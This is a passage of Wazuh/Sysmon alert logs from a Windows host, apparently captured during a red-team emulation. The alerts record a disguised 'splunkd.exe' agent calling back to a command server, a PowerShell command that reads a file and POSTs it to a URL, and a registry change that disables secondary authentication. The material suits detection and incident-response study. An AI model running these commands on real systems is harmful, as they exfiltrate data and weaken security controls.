          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Windows Command Shell"
          ],
          "id": [
            "T1059.003"
          ],
          "tactic": [
            "Execution"
          ]
        },
        "id": "92052"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757612033.1626234",
      "timestamp": "2025-09-11T17:33:53.676+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:33:53.676Z"
      ]
    },
    "sort": [
      1757612033676
    ]
  },



  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "U0fWOZkBIDwfn7_zYKrr",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "PowerShell.EXE",
            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-f6cf-68c2-1627-000000000e00}",
            "description": "Windows PowerShell",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://192.168.1.90:8888 -group red",
            "processGuid": "{994437b3-07c1-68c3-bb27-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "10580",
            "processId": "10764",
            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
            "utcTime": "2025-09-11 17:32:49.605",
            "hashes": "MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D",
            "parentImage": "C:\\\\Users\\\\Public\\\\splunkd.exe",
            "company": "Microsoft Corporation",
            "commandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"$content = Get-Content C:\\\\Windows\\\\System32\\\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content\\\"",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:32:49.605\r\nProcessGuid: {994437b3-07c1-68c3-bb27-000000000e00}\r\nProcessId: 10764\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D\r\nParentProcessGuid: {994437b3-f6cf-68c2-1627-000000000e00}\r\nParentProcessId: 10580\r\nParentImage: C:\\Users\\Public\\splunkd.exe\r\nParentCommandLine: \"C:\\Users\\Public\\splunkd.exe\" -server http://192.168.1.90:8888 -group red \r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:32:49.6076212Z",
            "eventRecordID": "9939",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 2,
        "mail": false,
        "level": 3,
        "description": "Powershell was used to delete files or directories",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "File Deletion"
          ],
          "id": [
            "T1070.004"
          ],
          "tactic": [
            "Defense Evasion"
          ]
        },
        "id": "92021"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611970.1617034",
      "timestamp": "2025-09-11T17:32:50.656+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:32:50.656Z"
      ]
    },
    "sort": [
      1757611970656
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "S0fTOZkBIDwfn7_zeqp8",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "reg.exe",
            "image": "C:\\\\Windows\\\\System32\\\\reg.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-06fd-68c3-b427-000000000e00}",
            "description": "Registry Console Tool",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "cmd.exe /C reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SecondaryAuthenticationFactor\\\" /v \\\"AllowSecondaryAuthenticationDevice\\\" /t REG_DWORD /d 0 /f",
            "processGuid": "{994437b3-06fd-68c3-b527-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "8764",
            "processId": "8420",
            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
            "utcTime": "2025-09-11 17:29:33.166",
            "hashes": "MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",
            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "company": "Microsoft Corporation",
            "commandLine": "reg  add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SecondaryAuthenticationFactor\\\" /v \\\"AllowSecondaryAuthenticationDevice\\\" /t REG_DWORD /d 0 /f",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:29:33.166\r\nProcessGuid: {994437b3-06fd-68c3-b527-000000000e00}\r\nProcessId: 8420\r\nImage: C:\\Windows\\System32\\reg.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Registry Console Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: reg.exe\r\nCommandLine: reg  add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D\r\nParentProcessGuid: {994437b3-06fd-68c3-b427-000000000e00}\r\nParentProcessId: 8764\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe /C reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:29:33.1687329Z",
            "eventRecordID": "9932",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 3,
        "mail": false,
        "level": 10,
        "description": "Value added to registry key has Base64-like pattern",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Obfuscated Files or Information",
            "Modify Registry"
          ],
          "id": [
            "T1027",
            "T1112"
          ],
          "tactic": [
            "Defense Evasion"
          ]
        },
        "id": "92041"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611774.1589886",
      "timestamp": "2025-09-11T17:29:34.263+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:29:34.263Z"
      ]
    },
    "sort": [
      1757611774263
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "REfQOZkBIDwfn7_zp6rt",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "processGuid": "{994437b3-0644-68c3-ad27-000000000e00}",
            "processId": "10596",
            "utcTime": "2025-09-11 17:26:29.775",
            "targetFilename": "C:\\\\Users\\\\env-admin\\\\Downloads\\\\T1036\\\\README.cmd",
            "ruleName": "Downloads",
            "creationUtcTime": "2025-09-11 17:26:29.775",
            "user": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "11",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"File created:\r\nRuleName: Downloads\r\nUtcTime: 2025-09-11 17:26:29.775\r\nProcessGuid: {994437b3-0644-68c3-ad27-000000000e00}\r\nProcessId: 10596\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\env-admin\\Downloads\\T1036\\README.cmd\r\nCreationUtcTime: 2025-09-11 17:26:29.775\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "2",
            "systemTime": "2025-09-11T17:26:29.7843690Z",
            "eventRecordID": "9918",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "11",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 9,
        "description": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe created a new scripting file under Windows Temp or User data folder",
        "groups": [
          "sysmon",
          "sysmon_eid11_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Ingress Tool Transfer",
            "Command and Scripting Interpreter"
          ],
          "id": [
            "T1105",
            "T1059"
          ],
          "tactic": [
            "Command and Control",
            "Execution"
          ]
        },
        "id": "92201"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611590.1558176",
      "timestamp": "2025-09-11T17:26:30.527+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:26:30.527Z"
      ]
    },
    "sort": [
      1757611590527
    ]
  },


